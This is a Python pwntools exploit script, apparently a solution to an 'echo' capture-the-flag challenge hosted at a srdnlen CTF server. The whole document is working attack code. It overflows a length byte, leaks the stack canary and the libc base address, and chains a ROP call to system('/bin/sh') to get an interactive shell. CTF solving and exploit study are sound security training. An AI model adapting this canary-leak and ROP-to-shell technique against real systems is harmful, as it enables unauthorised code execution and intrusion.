from typing import Literal
from ctypes import CDLL
import os
import pwn

pwn.context.log_level = "debug"
exe_path = "binary"
gdbscript: str = """
	c
"""

def exploit():
	exe = pwn.context.binary = pwn.ELF(exe_path)
	libc = exe.libc
	if (libc and pwn.context.arch == "amd64"):
		cdll = CDLL(libc.path)

	# <interactions>

	with connect(
		[exe.path], "echo.challs.srdnlen.it", "1091",
		gdbscript, ssl=False,
		default_mode="local",
	) as io:

		# Override buffer length
		rop = pwn.ROP([libc])
		rop.raw(b"A"*64)
		rop.raw(b"\x48") # length of the next payload
		io.sendafter(b"echo ", bytes(rop))

		# Leak canary
		rop = pwn.ROP([libc])
		rop.raw(b"A"*64)
		rop.raw(b"\x77") # length of the next payload
		rop.raw(b"A"*7)
		rop.raw(b"\xff") # override canary null-terminator
		io.sendafter(b"echo ", bytes(rop))
		io.recvuntil(b"\xff")
		canary = int.from_bytes(b"\0" + io.recvn(7), byteorder="little")
		print("canary:", hex(canary))

		# Leak libc base
		rop = pwn.ROP([libc])
		rop.raw(b"A"*64)
		rop.raw(b"\xf8") # long read
		rop.raw(b"A"*7)
		rop.raw(b"A"*8) # canary placeholder
		rop.raw(b"A"*8)
		rop.raw(b"A"*8)
		rop.raw(b"A"*16)
		rop.raw(b"A"*7)
		rop.raw(b"\xff") # after this there is the main return address
		io.sendafter(b"echo ", bytes(rop))
		io.recvuntil(b"\xff")
		libc.address = int.from_bytes(io.recvn(6), byteorder="little") - 0x02a1ca
		print("ASLR:", hex(libc.address))

		# Actual ROP too system("/bin/sh")
		rop = pwn.ROP([libc])
		rop.raw(b"\0")
		rop.raw(b"A"*63)
		rop.raw(b"\xf8")
		rop.raw(b"A"*7)
		rop.raw(canary)
		rop.raw(b"A"*8)
		rop.raw(rop.ret.address)
		rop.call("system", [next(libc.search(b"/bin/sh\0"))])
		io.sendlineafter(b"echo ", bytes(rop))

		io.interactive()


def main():
	exploit()


def connect(
		args: list[str], hostname: str, port: int | str,
		gdbscript: str = '', ssl: bool = False,
		default_mode: Literal["remote", "local", "gdb"] = "local",
	) -> pwn.tube:

	if pwn.args.LOCAL:
		mode = "local"
	elif pwn.args.GDB:
		mode = "gdb"
	elif pwn.args.REMOTE:
		mode = "remote"
	else:
		mode = default_mode

	if mode == "remote":
		io = pwn.remote(hostname, port, ssl=ssl)
	elif mode == "local":
		io = pwn.process(argv=args)
	elif mode == "gdb":
		io = pwn.gdb.debug(args=args, gdbscript=gdbscript)
	else:
		raise ValueError("Unknown mode")

	return io


def protect_ptr(pos, ptr):
	return (pos >> 12) ^ ptr

def decrypt_ptr(val):
    mask = 0xfff << (64-12)
    while mask:
        v = val & mask
        val ^= v >> 12
        mask >>= 12
    return val



if __name__ == "__main__":
	main()
